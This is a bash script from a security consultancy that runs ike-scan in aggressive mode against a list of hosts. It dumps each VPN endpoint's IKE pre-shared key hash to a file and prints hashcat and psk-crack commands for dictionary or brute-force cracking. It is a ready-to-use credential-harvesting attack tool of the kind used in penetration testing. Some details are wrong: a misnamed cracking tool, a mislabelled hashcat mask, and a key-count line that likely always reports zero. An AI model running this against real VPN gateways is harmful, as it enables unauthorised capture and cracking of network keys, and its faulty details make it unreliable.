#!/bin/bash
# pskdump.sh
# Dumps IKE Pre-Shared Keys (PSK) of list of hosts
# Created because ike-scan -A --pskcrack doesn't work with -f <file> for multi-host dumping
# By Sebastien Jeanquier (@securitygen)
# Security Generation - http://www.securitygeneration.com
#
# ChangeLog -
# 0.1: Initial release
# 0.2: Added -p flag to accept custom source port number
#
# Disclaimer: Quick and dirty hack. Use at own risk!
# -------------------------------------------------------------

srcport=500 # default IKE src port

function usage {
	echo "Description: Runs ike-scan on file of hosts."
	echo "Usage: $0 [-p port] {inputfile} (one IP/host per line)"
	echo "    Default ike-scan runs from src-port 500 (requires root)"
	echo "    Optional -p to provide alternate source port."
}

if [ $# -eq 0 ];
then
	usage "$0";
	exit
else
	while getopts ":p:" opt
	do
	    case "$opt" in
		    p)  
			    srcport=$OPTARG
			    ;;
		    \?) 
			    echo "Invalid option: -$OPTARG" >&2
			    usage "$0"; exit 1
			    ;;
		    :) 
			    echo "Option -$OPTARG requires a numeric argument." >&2
			    exit 1
			    ;;
	    esac
	done
	shift "$((OPTIND-1))"

	# Assign input file parameter to variable
	inputfile=$1

	# Check inputfile exists and user is root if $srcport < 1024	
	if [[ -z $1 ]]; then
		echo "Error: supply a filename."
		exit 1
	elif [[ ! -f $1 ]]; then
		echo "Error: File '$1' doesn't exist."
		exit 1
	elif [ "$srcport" -lt 1024 ] && [[ $EUID -ne 0 ]]; then
		echo "ike-scan requires root to run on source ports < 1024."
		exit 1
	else
		mkdir /tmp/pskdump 2>/dev/null
	fi

    while read -r ip
    do
        ike-scan -A -s "$srcport" -P/tmp/pskdump/"$ip" "$ip"
    done < "$inputfile"

	if [ "$(ls -A /tmp/pskdump)" ]; then
		cat /tmp/pskdump/* > pskdump.txt
		count=$(< pskdump.txt | wc -l | tr -d ' ')
	fi
	if [[ $count -gt 0 ]]; then
		echo
		echo "Dumped $count pre-shared keys to pskdump.txt."
		echo
		echo "Crack using psk-crack or hashcat:"
		echo "  psk-dump pskdump.txt (for dictionary) or psk-dump -B <num> pskdump.txt (for bruteforce, where num is password lenth)"
		echo "  hashcat -m 5300 pskdump.txt <dict> or hashcat -m 5300 pskdump.txt -a 3 ?a?a?a?a?a?a (to brute force 6 upper+lower alphanumeric)"
	else
		echo -e "\nNo PSKs dumped, sorry. Try harder next time."
	fi
fi

